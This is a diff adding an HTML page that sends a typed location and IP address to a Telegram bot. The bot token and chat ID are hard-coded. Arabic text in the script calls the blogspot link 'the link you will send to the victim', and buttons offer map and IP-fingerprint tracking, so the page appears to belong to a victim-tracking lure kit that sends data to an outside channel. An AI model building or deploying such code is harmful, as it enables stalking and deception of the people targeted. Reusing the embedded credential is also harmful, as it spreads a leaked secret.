@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Send Location to Telegram Bot</title>
+  <style>
+    body {
+      background-image: url('xx.jpg');
+      background-repeat: no-repeat;
+      background-attachment: fixed; 
+      background-size: 100% 100%;
+    }
+    input {
+      display: block;
+      margin: 10px 0;
+      padding: 5px;
+      font-size: 16px;
+    }
+    button {
+      display: block;
+      margin: 10px 0;
+      padding: 10px;
+      font-size: 16px;
+      background-color: #008CBA;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h1>Send Location to Telegram Bot</h1>
+  <form>
+    <label for="location">Location:</label>
+    <input type="text" id="location" name="location" placeholder="Enter location here" required>
+
+    <label for="ip">IP Address:</label>
+    <input type="text" id="ip" name="ip" placeholder="Enter IP address here" required>
+
+    <button type="button" id="send-button">Send Location to Telegram Bot</button>
+  </form>
+
+  <script>
+    // Get references to the location and IP input fields
+    const locationInput = document.getElementById('location');
+    const ipInput = document.getElementById('ip');
+
+    // Get references to the send button and set up a click event listener
+    const sendButton = document.getElementById('send-button');
+    sendButton.addEventListener('click', () => {
+      const location = locationInput.value;
+      const ip = ipInput.value;
+
+      // Set up the Telegram bot API credentials
+      const botToken = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+      const telegramApiUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+
+      // Set up the message to send to the Telegram bot
+      const message = `Location: ${location}\nIP: ${ip}\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com`;
+
+      // Set up the inline keyboard with buttons
+      const keyboard = [
+        [
+          {
+            text: 'فتح الموقع',
+            url: `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(location)}`
+          }
+        ],
+        [
+          {
+            text: 'تتبع بصمة الايبي',
+            url: `https://www.iplocation.net/ip-lookup?addr=${encodeURIComponent(ip)}`
+          }
+        ]
+      ];
+
+      const inlineKeyboard = { inline_keyboard: keyboard };
+      const replyMarkup = JSON.stringify(inlineKeyboard);
+
+      // Send the message to the Telegram bot with the inline keyboard
+      const postFields = { chat_id: '373715044', text: message, reply_markup: replyMarkup };
+      fetch(telegramApiUrl, { method: 'POST', body: JSON.stringify(postFields) })
+        .then(response => console.log('Location data sent to Telegram bot'))
+        .catch(error => console.error('Location data not sent to Telegram bot', error));
+    });
+  </script>
+</body>
+</html>
